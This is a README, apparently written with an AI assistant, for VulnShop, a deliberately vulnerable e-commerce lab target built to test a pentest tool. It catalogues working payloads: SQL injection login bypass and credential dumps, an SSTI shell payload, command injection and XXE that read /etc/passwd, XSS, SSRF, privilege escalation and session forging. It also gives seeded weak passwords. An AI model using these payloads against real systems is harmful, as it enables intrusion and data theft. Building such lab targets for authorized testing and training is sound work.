# VulnShop — Intentionally Vulnerable E-Commerce Target

A realistic storefront (products, cart, auth, orders, admin dashboard) that is
**deliberately** full of security holes, so you can point your PentestAI
platform at it and confirm that each phase — **Discovery**,
**Pre-Authentication Exploitation**, **Post-Authentication Exploitation** —
detects and reports findings correctly.

It is the same idea as OWASP Juice Shop / DVWA / bWAPP: a safe punching bag for
authorized testing.

> ## ⚠️ Safety first — read this
> This app has SQL injection, RCE, command injection, XXE, SSRF and more, **by
> design**. Treat the running container as hostile.
> - Run it **only** on an isolated host / lab network you control.
> - **Never** publish it to a public IP, a shared VPS, or any network with
>   real data. The RCE paths give full control of the container.
> - Only test systems you are **authorized** to test.
> - Tear it down when you're done (`docker compose down -v`).

---

## 1. Quick start (Docker Compose)

```bash
cd vulnshop
docker compose up --build
```

Then open **http://localhost:5000**.

The stack is two containers:

| Service | Image          | Port  | Why it's there                                  |
|---------|----------------|-------|-------------------------------------------------|
| `web`   | `vulnshop:latest` (Flask) | 5000  | storefront + every web vulnerability            |
| `db`    | `mysql:5.7` (EOL) | 3306  | real SQL backend; exposed on purpose for Nmap   |

Seed accounts (also recoverable through the vulns):

| Username | Password      | Role  |
|----------|---------------|-------|
| admin    | `admin123`    | admin |
| alice    | `password123` | user  |
| bob      | `qwerty`      | user  |
| charlie  | `letmein`     | user  |

Stop and wipe:
```bash
docker compose down -v
```

---

## 2. Vulnerability catalog by testing phase

Replace `TARGET` with `http://localhost:5000` (or the container IP your scanner uses).

### Phase 1 — Discovery

These make `Nmap`, `WhatWeb`, `dirsearch`, `ping`, etc. return interesting /
abnormal results.

| # | Finding | Where | How to observe |
|---|---------|-------|----------------|
| D1 | Misleading + verbose server banners | all responses | `whatweb TARGET` → reports `Apache 2.4.29`, `PHP/5.6.40`, `Werkzeug/2.0.3`, `Python/3.9.18` (deliberately contradictory fingerprint) |
| D2 | Missing security headers, insecure cookies | all responses | `curl -I TARGET` → no CSP / X-Frame-Options / HSTS; `session` cookie has no `HttpOnly`/`Secure`/`SameSite` |
| D3 | `robots.txt` leaks private paths | `/robots.txt` | lists `/admin /backup /.env /.git /api /debug /server-status` |
| D4 | Exposed secrets | `/.env`, `/config.py` | `curl TARGET/.env` → SECRET_KEY, DB creds, AWS & Stripe keys |
| D5 | Exposed source control | `/.git/config`, `/.git/HEAD` | `curl TARGET/.git/config` → remote URL with an embedded deploy token |
| D6 | Exposed DB backup | `/backup/vulnshop_backup.sql` | full user dump incl. cleartext passwords & card numbers |
| D7 | Fake Apache status / phpinfo | `/server-status`, `/phpinfo` | fingerprint confusion + internal IPs / DB string leak |
| D8 | Directory listing | `/uploads/` | lists uploaded files |
| D9 | Debug/env disclosure | `/debug` | dumps full environment, headers, and the app secret key |
| D10 | Werkzeug interactive debugger | any 500 | `debug=True` → stack traces + an RCE console on errors |
| D11 | Exposed legacy database | `tcp/3306` | `nmap -sV -p 3306 TARGET` → `MySQL 5.7.x` (EOL, CVE-rich) |

Example discovery run:
```bash
nmap -sV -p 5000,3306 TARGET
whatweb http://TARGET:5000
dirsearch -u http://TARGET:5000 -w /usr/share/wordlists/dirb/common.txt
curl -s http://TARGET:5000/.env
curl -s http://TARGET:5000/backup/vulnshop_backup.sql
```

### Phase 2 — Pre-Authentication Exploitation

No login required.

| # | Vulnerability (OWASP) | Endpoint | Proof-of-concept payload |
|---|------------------------|----------|--------------------------|
| P1 | **SQLi – auth bypass** (A03) | `POST /login` | username `admin' -- -` (any password) → logs in as admin. Also `' OR 1=1 LIMIT 1 -- -` |
| P2 | **SQLi – UNION extract** (A03) | `GET /search?q=` | `' UNION SELECT id,username,0,password FROM users-- -` → dumps credentials into the product list |
| P3 | **SQLi – numeric** (A03) | `GET /product/<id>` | `/product/0 UNION SELECT id,username,password,email,1,1 FROM users-- -` |
| P4 | **Reflected XSS** (A03) | `/search?q=`, `/api/echo?msg=` | `<script>alert(document.domain)</script>` |
| P5 | **SSTI – Jinja2** (A03) | `/hello?name=` | `{{7*7}}` → `49`; `{{config}}`; `{{ cycler.__init__.__globals__.os.popen('id').read() }}` |
| P6 | **OS command injection** (A03) | `/admin/ping` | `host=127.0.0.1; id` or `127.0.0.1 && cat /etc/passwd` |
| P7 | **Path traversal / LFI** (A01) | `/download?file=` | `/download?file=../../etc/passwd`, `/download?file=config.py` |
| P8 | **Open redirect** (A01) | `/redirect?url=` | `/redirect?url=https://evil.example.com` |
| P9 | **SSRF** (A10) | `/admin/fetch?url=` | `/admin/fetch?url=http://db:3306`, `file:///etc/passwd`, cloud metadata |
| P10 | **XXE** (A05) | `POST /api/import` | see XML below → reads `/etc/passwd` |
| P11 | **IDOR / excessive data exposure** (A01) | `/api/user/<id>` | `/api/user/1` returns admin password, card, api_key — unauthenticated |
| P12 | **User enumeration + no rate-limit** (A07) | `/login`, `/register` | distinct "no such username" vs "wrong password"; unlimited attempts |

XXE body (P10):
```bash
curl -s http://TARGET:5000/api/import -H 'Content-Type: application/xml' --data-binary '
<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]>
<order><note>&x;</note></order>'
```

Command-injection example (P6):
```bash
curl -s "http://TARGET:5000/admin/ping" -H "X-Admin: true" \
     --data-urlencode "host=127.0.0.1; cat /etc/passwd"
```

### Phase 3 — Post-Authentication Exploitation

Log in first (or bypass with P1).

| # | Vulnerability (OWASP) | Endpoint | Proof-of-concept |
|---|------------------------|----------|------------------|
| A1 | **Stored XSS** (A03) | `POST /product/<id>/review`, `/profile/update` (bio) | review/bio `<script>alert(1)</script>` → fires for every visitor at `/product/<id>` and `/user/<id>` |
| A2 | **IDOR – read any order** (A01) | `/order/<id>` | `/order/1001`, `/order/1003` → other users' totals, emails, cards |
| A3 | **Mass assignment → priv-esc** (A08) | `/register`, `/profile/update` | add field `is_admin=1` → instant admin |
| A4 | **Broken access control** (A01) | `/admin` | header `X-Admin: true` grants the panel with no account |
| A5 | **Session forgery** (A02/A07) | `session` cookie | SECRET_KEY is known (`/.env`) → forge an admin cookie with `flask-unsign` |
| A6 | **Insecure deserialization** (A08) | `prefs` cookie | base64(pickle) loaded on every request → RCE |
| A7 | **Unrestricted file upload** (A05) | `/profile/avatar` | upload `x.html` with `<script>` → stored XSS served from `/uploads/x.html` |
| A8 | **Business-logic flaw** (A04) | `/cart/update` | set `qty=-5` → negative line total / negative order |
| A9 | **CSRF** (A01) | every `POST` | no anti-CSRF token anywhere (add-to-cart, review, profile, checkout) |

Mass-assignment priv-esc (A3):
```bash
curl -s http://TARGET:5000/register \
  -d 'username=evil&email=e@e.com&password=pass&is_admin=1'
```

Forge an admin session with the leaked key (A5):
```bash
pip install flask-unsign
flask-unsign --sign \
  --cookie "{'user_id': 1, 'is_admin': True}" \
  --secret 's3cr3t-dev-key-change-me'
# use the output as the "session" cookie
```

---

## 3. Build the Docker image

The Compose file builds it for you, but to build and tag it standalone:

```bash
cd vulnshop
docker build -t vulnshop:latest .
```

Run just the web image against your own MySQL, or with Compose (recommended,
since it wires up the seeded database):

```bash
docker compose up --build -d
docker compose logs -f web      # watch it come up
```

---

## 4. Publish to Docker Hub

So your pentest app (or a teammate) can pull the target anywhere.

1. **Create a repo** on https://hub.docker.com (e.g. `vulnshop`). Give it a
   clear name and description like *"Intentionally vulnerable target — lab use
   only"* so nobody deploys it by accident.

2. **Log in** from the CLI:
   ```bash
   docker login
   ```

3. **Tag** the image for your account (replace `YOURNAME`):
   ```bash
   docker tag vulnshop:latest YOURNAME/vulnshop:1.0
   docker tag vulnshop:latest YOURNAME/vulnshop:latest
   ```

4. **Push**:
   ```bash
   docker push YOURNAME/vulnshop:1.0
   docker push YOURNAME/vulnshop:latest
   ```

> The database comes from the official `mysql:5.7` image plus `init.sql`, so you
> only publish the `web` image. The database is reproduced by the Compose file
> (next section). If you'd rather ship a single self-seeding image, bake the data
> in — ask and I'll provide a SQLite-only variant with no second container.

### Optional: multi-architecture build (Apple Silicon + x86)
```bash
docker buildx create --use
docker buildx build --platform linux/amd64,linux/arm64 \
  -t YOURNAME/vulnshop:1.0 -t YOURNAME/vulnshop:latest --push .
```

---

## 5. Pull and run from Docker Hub (use as a target)

On the machine running your PentestAI platform:

**Option A — full stack with the seeded DB (recommended).** Create a
`docker-compose.yml` that pulls your published web image:

```yaml
services:
  web:
    image: YOURNAME/vulnshop:latest
    ports: ["5000:5000"]
    environment:
      DB_HOST: db
      DB_USER: vulnshop
      DB_PASS: vulnshop123
      DB_NAME: vulnshop
    depends_on: [db]
  db:
    image: mysql:5.7
    command: --default-authentication-plugin=mysql_native_password
    ports: ["3306:3306"]
    environment:
      MYSQL_ROOT_PASSWORD: root
      MYSQL_DATABASE: vulnshop
      MYSQL_USER: vulnshop
      MYSQL_PASSWORD: vulnshop123
    volumes:
      - ./init.sql:/docker-entrypoint-initdb.d/init.sql:ro
```
Keep `init.sql` next to it, then:
```bash
docker compose pull
docker compose up -d
```

**Option B — just pull the web image** (point it at a MySQL you already run):
```bash
docker pull YOURNAME/vulnshop:latest
docker run -d -p 5000:5000 \
  -e DB_HOST=<mysql-host> -e DB_USER=vulnshop -e DB_PASS=vulnshop123 -e DB_NAME=vulnshop \
  --name vulnshop YOURNAME/vulnshop:latest
```

Point your scanner at `http://<host>:5000` and `tcp/3306` and run your three
phases. Reset the target between runs with:
```bash
docker compose down -v && docker compose up -d
```

---

## 6. File layout

```
vulnshop/
├── app.py                 # Flask app — all routes & vulnerabilities (commented by phase)
├── config.py              # weak secret + creds (served at /config.py on purpose)
├── .env                   # fake-but-live-looking secrets (served at /.env)
├── init.sql               # schema + seed data (loaded by the db container)
├── requirements.txt       # pinned OLD versions (outdated-components finding)
├── Dockerfile
├── docker-compose.yml
├── robots.txt
├── backup/
│   └── vulnshop_backup.sql # exposed credential dump
├── .git/{config,HEAD}      # exposed SCM metadata
├── uploads/                # unrestricted upload target
├── static/css/style.css    # storefront styling
└── templates/              # Jinja2 pages (|safe used deliberately for XSS)
```

Every vulnerability in `app.py` is tagged with a `# VULN:` comment explaining
the sink and the payload, so you can line up each scanner finding with the
exact code that produced it when you write your report.
